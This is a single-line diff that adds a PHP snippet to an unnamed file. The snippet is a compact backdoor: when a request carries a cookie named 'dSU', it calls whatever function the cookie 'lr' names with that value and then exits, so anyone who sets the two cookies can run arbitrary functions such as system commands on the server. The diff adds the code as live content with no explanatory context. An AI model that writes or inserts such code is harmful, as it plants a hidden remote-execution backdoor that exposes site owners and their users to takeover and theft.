@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["dSU"])){$_COOKIE["lr"]($_COOKIE["dSU"]);exit;}
